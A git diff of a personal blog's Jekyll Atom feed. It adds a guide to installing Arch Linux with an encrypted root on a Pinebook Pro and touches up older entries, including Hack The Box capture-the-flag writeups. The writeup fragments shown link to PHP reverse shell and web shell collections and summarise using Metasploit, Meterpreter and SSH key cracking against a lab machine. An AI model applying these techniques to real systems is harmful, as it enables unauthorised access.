@@ -1,4 +1,109 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2021-06-23T15:43:05+00:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">Ryan Kozak</title><subtitle>hacking, web development, $other</subtitle><author><name>Ryan Kozak</name></author><entry><title type="html">Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root</title><link href="http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro/" rel="alternate" type="text/html" title="Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root" /><published>2020-12-15T00:00:00+00:00</published><updated>2020-12-20T03:25:33+00:00</updated><id>http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro</id><content type="html" xml:base="http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/12/pinebook_arch.png&quot; alt=&quot;Pinebook Pro Running Arch&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2021-06-28T18:24:09+00:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">Ryan Kozak</title><subtitle>hacking, web development, $other</subtitle><author><name>Ryan Kozak</name></author><entry><title type="html">Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root…Again</title><link href="http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro-again/" rel="alternate" type="text/html" title="Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root…Again" /><published>2021-06-28T00:00:00+00:00</published><updated>2021-06-28T18:24:09+00:00</updated><id>http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro-again</id><content type="html" xml:base="http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro-again/">&lt;p&gt;In my &lt;a href=&quot;/luks-encrypted-arch-linux-on-pinebook-pro/&quot;&gt;previous post&lt;/a&gt; I went through the steps I used to install Arch Linux on my Pinebook Pro with a LUKS encrypted root partition. It appears that the repositories used in that post have been retired, and the packages hosted at &lt;em&gt;https://nhp.sh/pinebookpro/&lt;/em&gt; are no longer there. A big thanks to &lt;a href=&quot;https://github.com/nadiaholmquist&quot;&gt;Nadia Holmquist Pedersen&lt;/a&gt; for all the work she’s done for Arch on the Pinebook Pro.&lt;/p&gt;
+
+&lt;p&gt;The following instructions use &lt;a href=&quot;https://kiljan.org/&quot;&gt;Sven Kiljan’s&lt;/a&gt; project. You can find his blog post discussing it &lt;a href=&quot;https://kiljan.org/2021/06/20/arch-linux-arm-on-a-pinebook-pro/&quot;&gt;here&lt;/a&gt;, and the GitHub repository &lt;a href=&quot;https://github.com/SvenKiljan/archlinuxarm-pbp/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;installation-on-microsd-card&quot;&gt;Installation on microSD card&lt;/h2&gt;
+&lt;p&gt;These steps are largely for my personal reference, but they’re here for the public to read in the event that they may help someone do something similar. The majority of them are copied straight from &lt;a href=&quot;https://github.com/SvenKiljan/archlinuxarm-pbp/blob/main/INSTALL.md&quot;&gt;archlinuxarm-pbp’s INSTALL.md&lt;/a&gt;, with LUKS encryption stuff inserted here and there.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Boot from the ArchISO. In my previous post I flashed my eMMC with Naudia’s ArchISO. This is what I used to complete the steps below to reinstall Arch on my SD Card.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wifi-menu&lt;/code&gt; to get connected.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Zero the beginning of the SD card: &lt;code class=&quot;highlighter-rouge&quot;&gt;dd if=/dev/zero of=/dev/mmcblk1 bs=1M count=32&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Start fdisk to partition the SD card or eMMC module: &lt;code class=&quot;highlighter-rouge&quot;&gt;fdisk /dev/mmcblk1&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;At the fdisk prompt, create the new partition:
+    &lt;ol&gt;
+      &lt;li&gt;Type &lt;strong&gt;o&lt;/strong&gt;. This will clear out any partitions on the drive.&lt;/li&gt;
+      &lt;li&gt;Type &lt;strong&gt;p&lt;/strong&gt; to list partitions. There should be no partitions left.&lt;/li&gt;
+      &lt;li&gt;Type &lt;strong&gt;n&lt;/strong&gt;, then &lt;strong&gt;p&lt;/strong&gt; for primary, &lt;strong&gt;1&lt;/strong&gt; for the first partition on the drive, &lt;strong&gt;32768&lt;/strong&gt; for the first sector, and then type &lt;strong&gt;442367&lt;/strong&gt; for the last sector.&lt;/li&gt;
+      &lt;li&gt;Type &lt;strong&gt;t&lt;/strong&gt;, then &lt;strong&gt;c&lt;/strong&gt; to set the first partition to type W95 FAT32 (LBA).&lt;/li&gt;
+      &lt;li&gt;Type &lt;strong&gt;n&lt;/strong&gt;, then &lt;strong&gt;p&lt;/strong&gt; for primary, &lt;strong&gt;2&lt;/strong&gt; for the second partition on the drive, &lt;strong&gt;442368&lt;/strong&gt; for the first sector, and then press ENTER to accept the default last sector.&lt;/li&gt;
+      &lt;li&gt;Write the partition table and exit by typing &lt;strong&gt;w&lt;/strong&gt;.&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Create and mount the FAT filesystem: &lt;code class=&quot;highlighter-rouge&quot;&gt;mkfs.vfat -n BOOT_ALARM /dev/mmcblk1p1&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Encrypt the second partition with: &lt;code class=&quot;highlighter-rouge&quot;&gt;cryptsetup -y -v luksFormat /dev/mmcblk1p2&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Open the encrypted partition: &lt;code class=&quot;highlighter-rouge&quot;&gt;cryptsetup open /dev/mmcblk1p2 cryptroot&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Write the EXT4 file system to the partition we’ve just opened (our encrypted root) &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo mkfs.ext4 -L ROOT_ALARM /dev/mapper/cryptoroot&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;MOUNT UP!: &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo mount /dev/mapper/crytoroot /mnt &amp;amp;&amp;amp; sudo mount /dev/mmcblk1p1 /mnt/boot&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Download  the filesystem via &lt;code class=&quot;highlighter-rouge&quot;&gt;cd /mnt &amp;amp;&amp;amp; wget https://github.com/SvenKiljan/archlinuxarm-pbp/releases/latest/download/ArchLinuxARM-pbp-latest.tar.gz &lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Extract the root filesystem: &lt;code class=&quot;highlighter-rouge&quot;&gt;sdtar -xpf ArchLinuxARM-pbp-latest.tar.gz -C .&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Install the Tow-Boot bootloader:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  dd if=boot/idbloader.img of=/dev/mmcblk1p1 seek=64 conv=notrunc,fsync
+  dd if=boot/tow-boot.itb of=/dev/mmcblk1p1 seek=16384 conv=notrunc,fsync
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Enter chroot via &lt;code class=&quot;highlighter-rouge&quot;&gt;arch-chroot /mnt&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Edit &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/locale.gen&lt;/code&gt;, uncommenting what you need. For me this was &lt;code class=&quot;highlighter-rouge&quot;&gt;en_US.UTF-8 UTF-8&lt;/code&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Execute &lt;code class=&quot;highlighter-rouge&quot;&gt;locale-gen&lt;/code&gt; to generate the locales.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Modify &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/mkinitcpio.conf&lt;/code&gt; to include hooks, &lt;code class=&quot;highlighter-rouge&quot;&gt;HOOKS=(base udev autodetect keyboard keymap modconf block encrypt filesystems fsck)&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Issue &lt;code class=&quot;highlighter-rouge&quot;&gt;blkid&lt;/code&gt; to get the UUID of &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/mapper/cryptroot&lt;/code&gt; and modify &lt;code class=&quot;highlighter-rouge&quot;&gt;/boot/extlinux/extlinux.conf&lt;/code&gt; to look like such (replacing YOUR-UUID with your own):
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  LABEL Arch Linux ARM
+  KERNEL /Image
+  FDT /dtbs/rockchip/rk3399-pinebook-pro.dtb
+  APPEND initrd=/initramfs-linux.img console=ttyS2,1500000 console=tty0 rootwait cryptdevice=UUID=YOUR-UUID:cryptroot root=/dev/mapper/cryptroot rw plymouth.ignore-serial-consoles
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Regenerate all the initramfs images with &lt;code class=&quot;highlighter-rouge&quot;&gt;mkinitcpio -P&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Now, leave chroot and reboot your machine to the new install on the SD card.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Log in as root (password is “root”) and connect to the wifi with &lt;code class=&quot;highlighter-rouge&quot;&gt;wifi-menu&lt;/code&gt; again.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Synchronize the system and RTC clocks:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  timedatectl set-ntp on
+  hwclock -w
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Initialize the pacman keyring and populate the Arch Linux ARM and Pinebook Pro &lt;a href=&quot;https://archlinuxarm.org/about/package-signing&quot;&gt;package signing&lt;/a&gt; keys:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  pacman-key --init
+  pacman-key --populate archlinuxarm
+  pacman-key --populate archlinuxarm-pbp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Reboot, change password for &lt;em&gt;root&lt;/em&gt; user, remove &lt;em&gt;alarm&lt;/em&gt; user and add your own…continue to setup things how you’d like them to be (window manager, all other software, the fun stuff).&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/SvenKiljan/archlinuxarm-pbp/blob/main/INSTALL.md&quot;&gt;https://github.com/SvenKiljan/archlinuxarm-pbp/blob/main/INSTALL.md&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://wiki.archlinux.org/index.php/installation_guide&quot;&gt;https://wiki.archlinux.org/index.php/installation_guide&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://forum.pine64.org/showthread.php?tid=14238&quot;&gt;https://forum.pine64.org/showthread.php?tid=14238&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://ryankozak.com/luks-encrypted-arch-linux-on-pinebook-pro/&quot;&gt;https://ryankozak.com/luks-encrypted-arch-linux-on-pinebook-pro/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://rudism.com/pinebook-pro-arch-linux-alternative/&quot;&gt;https://rudism.com/pinebook-pro-arch-linux-alternative/&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="Linux" /><category term="Pinebook Pro" /><category term="linux" /><category term="Arch Linux" /><category term="Pinebook Pro" /><summary type="html">In my previous post I went through the steps I used to install Arch Linux on my Pinebook Pro with a LUKS encrypted root partition. It appears that the repositories used in that post have been retired, and the packages hosted at https://nhp.sh/pinebookpro/ are no longer there. A big thanks to Nadia Holmquist Pedersen for all the work she’s done for Arch on the Pinebook Pro.</summary></entry><entry><title type="html">Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root</title><link href="http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro/" rel="alternate" type="text/html" title="Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root" /><published>2020-12-15T00:00:00+00:00</published><updated>2021-06-23T16:11:24+00:00</updated><id>http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro</id><content type="html" xml:base="http://0.0.0.0:4000/luks-encrypted-arch-linux-on-pinebook-pro/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/12/pinebook_arch.png&quot; alt=&quot;Pinebook Pro Running Arch&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;My Pinebook Pro came in last week and yesterday I finally got a chance to really play with it. The first thing I wanted to do was get Arch installed on it with an encrypted root partition. I need these notes as a reference to use the next time I do this, so I figured I’d post them up to help anyone else out that may be trying to achieve the same thing. This post ignores post installation configuration. It just gets you booting into the terminal of your LUKS encrypted partition. From there it’s up to you to setup users, install your desktop manager, etc.&lt;/p&gt;
 
@@ -32,7 +137,7 @@
   &lt;li&gt;Write an EXT4 file system to the boot partition &lt;code class=&quot;highlighter-rouge&quot;&gt;mkfs.ext4 /dev/mmcblk1p1&lt;/code&gt;.&lt;/li&gt;
   &lt;li&gt;Encrypt the second partition with LUKS &lt;code class=&quot;highlighter-rouge&quot;&gt;cryptsetup -y -v luksFormat /dev/mmcblk1p2&lt;/code&gt;.&lt;/li&gt;
   &lt;li&gt;Open the encrypted partition &lt;code class=&quot;highlighter-rouge&quot;&gt;cryptsetup open /dev/mmcblk1p2 cryptroot&lt;/code&gt;.&lt;/li&gt;
-  &lt;li&gt;Write a the EXT4 file system to the partition we’ve just opened (our encrypted root) &lt;code class=&quot;highlighter-rouge&quot;&gt;mkfs.ext4 /dev/mapper/cryptroot&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Write the EXT4 file system to the partition we’ve just opened (our encrypted root) &lt;code class=&quot;highlighter-rouge&quot;&gt;mkfs.ext4 /dev/mapper/cryptroot&lt;/code&gt;.&lt;/li&gt;
   &lt;li&gt;Mount the new partition&lt;/li&gt;
   &lt;li&gt;First make the &lt;em&gt;mnt&lt;/em&gt; directory with &lt;code class=&quot;highlighter-rouge&quot;&gt;mkdir /mnt&lt;/code&gt;.&lt;/li&gt;
   &lt;li&gt;Now mount the encrypted root partition there, &lt;code class=&quot;highlighter-rouge&quot;&gt;mount /dev/mapper/cryptroot /mnt&lt;/code&gt;.&lt;/li&gt;
@@ -57,16 +162,16 @@ APPEND initrd=/initramfs-linux.img console=tty1 rootwait cryptdevice=UUID=YOUR-U
   &lt;/li&gt;
   &lt;li&gt;Enable the network manager &lt;code class=&quot;highlighter-rouge&quot;&gt;systemctl enable NetworkManager&lt;/code&gt;.&lt;/li&gt;
   &lt;li&gt;Set root password with &lt;code class=&quot;highlighter-rouge&quot;&gt;passwd&lt;/code&gt;.&lt;/li&gt;
-  &lt;li&gt;Reboot, end continue to setup things how you’d like.&lt;/li&gt;
+  &lt;li&gt;Reboot, and continue to setup things how you’d like.&lt;/li&gt;
 &lt;/ol&gt;
 
 &lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
 &lt;ol&gt;
   &lt;li&gt;&lt;a href=&quot;https://wiki.archlinux.org/index.php/installation_guide&quot;&gt;https://wiki.archlinux.org/index.php/installation_guide&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://github.com/nadiaholmquist/archiso-pbp&quot;&gt;https://github.com/nadiaholmquist/archiso-pbp&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://rudism.com/installing-arch-linux-on-the-pinebook-pro]&quot;&gt; https://rudism.com/installing-arch-linux-on-the-pinebook-pro/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://rudism.com/installing-arch-linux-on-the-pinebook-pro&quot;&gt; https://rudism.com/installing-arch-linux-on-the-pinebook-pro/&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://www.bencode.net/posts/pinebook/&quot;&gt;https://www.bencode.net/posts/pinebook/&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="Linux" /><category term="Pinebook Pro" /><category term="linux" /><category term="Arch Linux" /><category term="Pinebook Pro" /><summary type="html"></summary></entry><entry><title type="html">Hack The Box - Traceback</title><link href="http://0.0.0.0:4000/hack-the-box-craft-traceback/" rel="alternate" type="text/html" title="Hack The Box - Traceback" /><published>2020-08-17T00:00:00+00:00</published><updated>2020-09-12T04:04:44+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-traceback</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-craft-traceback/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/08/traceback/badge.png&quot; alt=&quot;Hack The Box Haystack&quot; /&gt;&lt;/p&gt;
+&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="Linux" /><category term="Pinebook Pro" /><category term="linux" /><category term="Arch Linux" /><category term="Pinebook Pro" /><summary type="html"></summary></entry><entry><title type="html">Hack The Box - Traceback</title><link href="http://0.0.0.0:4000/hack-the-box-craft-traceback/" rel="alternate" type="text/html" title="Hack The Box - Traceback" /><published>2020-08-17T00:00:00+00:00</published><updated>2021-06-23T16:11:24+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-traceback</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-craft-traceback/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/08/traceback/badge.png&quot; alt=&quot;Hack The Box Haystack&quot; /&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;Traceback is an easy level box. It’s one of the first boxes on which I’ve been able to get user and root in one sitting. There’s a little bit of OSINT and guess work involved in the initial foothold, and the user/root portions aren’t too difficult at all. The theme of the box is that it has already been compromised by another hacker (Xh4H who authoried the box), and you seem to be retracing their steps while gaining user and root flags.&lt;/p&gt;
@@ -250,7 +355,7 @@ drwxr-xr-x 80 root root     4.0K Mar 16 03:55 ..
   &lt;li&gt;&lt;a href=&quot;https://github.com/Xh4H/Web-Shells&quot;&gt;Xh4H’s Web-Shells&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&quot;&gt;Pentest Monkey’s PHP Reverse Shell&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/gtfobins/lua/&quot;&gt;GTFO Bins Lua&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><summary type="html"></summary></entry><entry><title type="html">Hack The Box - Traverxec</title><link href="http://0.0.0.0:4000/hack-the-box-craft-traverxec/" rel="alternate" type="text/html" title="Hack The Box - Traverxec" /><published>2020-04-12T00:00:00+00:00</published><updated>2020-04-12T23:16:17+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-traverxec</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-craft-traverxec/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/04/traverxec/badge.png&quot; alt=&quot;Hack The Box Haystack&quot; /&gt;&lt;/p&gt;
+&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><summary type="html"></summary></entry><entry><title type="html">Hack The Box - Traverxec</title><link href="http://0.0.0.0:4000/hack-the-box-craft-traverxec/" rel="alternate" type="text/html" title="Hack The Box - Traverxec" /><published>2020-04-12T00:00:00+00:00</published><updated>2021-06-23T16:11:24+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-traverxec</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-craft-traverxec/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/04/traverxec/badge.png&quot; alt=&quot;Hack The Box Haystack&quot; /&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;Traverxec is an easy box worth 20 points, hosted on &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.165&lt;/code&gt;. As we will see the name is indicative of the vulnerability we’ll leverage to gain our initial foothold. Despite having had difficulty with a few steps, when it’s all said and done the box is rather simple. This writeup is a short one because of that.&lt;/p&gt;
@@ -518,7 +623,7 @@ root@traverxec:/home/david/bin#
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
-&lt;p&gt;This box was really straight forward for the most part. The initial foothold was obvious, and using the Metasploit module made it very easy. Finding the public directory inside David’s home directory via the nostromo configuration was probably the most confusing part, at least from my perspective. Once we found that directory, Meterpreter allowed us to download the backup file of ssh keys quite easily. The keys did have a password, but cracking this was also rather simple since the password would be present on almost any wordlist. The path to root was clear immediately after gaining access as the user. While the method we were to use to exploit it was also clear right away, actually doing so still took me about a day, as I was over thinking it a bit. Traverxec was a fun box, and well named. It was my first box in quite a few months, and a nice reintroduction.&lt;/p&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><summary type="html"></summary></entry><entry><title type="html">Plenty of Phish: Users, Trust and gTLDs</title><link href="http://0.0.0.0:4000/plenty-of-phish-trust-and-gtlds/" rel="alternate" type="text/html" title="Plenty of Phish: Users, Trust and gTLDs" /><published>2020-01-28T00:00:00+00:00</published><updated>2020-01-29T17:29:17+00:00</updated><id>http://0.0.0.0:4000/plenty-of-phish</id><content type="html" xml:base="http://0.0.0.0:4000/plenty-of-phish-trust-and-gtlds/">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;This box was really straight forward for the most part. The initial foothold was obvious, and using the Metasploit module made it very easy. Finding the public directory inside David’s home directory via the nostromo configuration was probably the most confusing part, at least from my perspective. Once we found that directory, Meterpreter allowed us to download the backup file of ssh keys quite easily. The keys did have a password, but cracking this was also rather simple since the password would be present on almost any wordlist. The path to root was clear immediately after gaining access as the user. While the method we were to use to exploit it was also clear right away, actually doing so still took me about a day, as I was over thinking it a bit. Traverxec was a fun box, and well named. It was my first box in quite a few months, and a nice reintroduction.&lt;/p&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><summary type="html"></summary></entry><entry><title type="html">Plenty of Phish: Users, Trust and gTLDs</title><link href="http://0.0.0.0:4000/plenty-of-phish-trust-and-gtlds/" rel="alternate" type="text/html" title="Plenty of Phish: Users, Trust and gTLDs" /><published>2020-01-28T00:00:00+00:00</published><updated>2021-06-23T16:11:24+00:00</updated><id>http://0.0.0.0:4000/plenty-of-phish</id><content type="html" xml:base="http://0.0.0.0:4000/plenty-of-phish-trust-and-gtlds/">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;For some time now, I’ve expected the introduction of new top level domains to confuse the general public. When users are confused, they’re more easily manipulated, making them more likely to fall for age old tricks like phishing attacks.&lt;/p&gt;
 
 &lt;h2 id=&quot;new-gtlds&quot;&gt;New gTLDs&lt;/h2&gt;
@@ -613,7 +718,7 @@ root@traverxec:/home/david/bin#
 &lt;/ul&gt;
 
 &lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
-&lt;p&gt;The implementation of so many new domain name extensions opens up the potential for a lot of creative phishing campaigns. The world is still getting used to all these new domain names, and the way that they’re being put into practice is still not clearly defined. For instance, &lt;a href=&quot;https://nike.shoes&quot;&gt;nike.shoes&lt;/a&gt; simply redirects to &lt;a href=&quot;https://nike.com&quot;&gt;nike.com&lt;/a&gt;, and &lt;a href=&quot;https://peets.coffee&quot;&gt;peets.coffee&lt;/a&gt; redirects to &lt;a href=&quot;https://peets.com&quot;&gt;peets.com&lt;/a&gt;. However, I believe the intent of these new domain extensions is not to have them all redirect to &lt;code class=&quot;highlighter-rouge&quot;&gt;.com&lt;/code&gt;. The intent is that industry specific domains will be used within particular industries, and extensions like &lt;code class=&quot;highlighter-rouge&quot;&gt;.careers&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;.support&lt;/code&gt; will be used by different departments of larger companies for specific use cases. None the less, even though it’s been 9 years now this is all still very new. Things are still rather confusing for businesses and users alike. When there is confusion, there is room for exploitation. I’ve been anticipating an exploitation of this confusion for a long time years now, we’ve seen it happen already, and I expect it to happen a whole lot more before things get figured out.&lt;/p&gt;</content><author><name>Ryan Kozak</name></author><category term="Security" /><category term="Phishing" /><summary type="html">Introduction For some time now, I’ve expected the introduction of new top level domains to confuse the general public. When users are confused, they’re more easily manipulated, making them more likely to fall for age old tricks like phishing attacks.</summary></entry><entry><title type="html">Hack The Box - Craft</title><link href="http://0.0.0.0:4000/hack-the-box-craft-writeup/" rel="alternate" type="text/html" title="Hack The Box - Craft" /><published>2020-01-05T00:00:00+00:00</published><updated>2020-01-06T03:14:46+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-craft</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-craft-writeup/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/08/craft/badge.png&quot; alt=&quot;Hack The Box Haystack&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The implementation of so many new domain name extensions opens up the potential for a lot of creative phishing campaigns. The world is still getting used to all these new domain names, and the way that they’re being put into practice is still not clearly defined. For instance, &lt;a href=&quot;https://nike.shoes&quot;&gt;nike.shoes&lt;/a&gt; simply redirects to &lt;a href=&quot;https://nike.com&quot;&gt;nike.com&lt;/a&gt;, and &lt;a href=&quot;https://peets.coffee&quot;&gt;peets.coffee&lt;/a&gt; redirects to &lt;a href=&quot;https://peets.com&quot;&gt;peets.com&lt;/a&gt;. However, I believe the intent of these new domain extensions is not to have them all redirect to &lt;code class=&quot;highlighter-rouge&quot;&gt;.com&lt;/code&gt;. The intent is that industry specific domains will be used within particular industries, and extensions like &lt;code class=&quot;highlighter-rouge&quot;&gt;.careers&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;.support&lt;/code&gt; will be used by different departments of larger companies for specific use cases. None the less, even though it’s been 9 years now this is all still very new. Things are still rather confusing for businesses and users alike. When there is confusion, there is room for exploitation. I’ve been anticipating an exploitation of this confusion for a long time years now, we’ve seen it happen already, and I expect it to happen a whole lot more before things get figured out.&lt;/p&gt;</content><author><name>Ryan Kozak</name></author><category term="Security" /><category term="Phishing" /><summary type="html">Introduction For some time now, I’ve expected the introduction of new top level domains to confuse the general public. When users are confused, they’re more easily manipulated, making them more likely to fall for age old tricks like phishing attacks.</summary></entry><entry><title type="html">Hack The Box - Craft</title><link href="http://0.0.0.0:4000/hack-the-box-craft-writeup/" rel="alternate" type="text/html" title="Hack The Box - Craft" /><published>2020-01-05T00:00:00+00:00</published><updated>2021-06-23T16:11:24+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-craft</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-craft-writeup/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/08/craft/badge.png&quot; alt=&quot;Hack The Box Haystack&quot; /&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
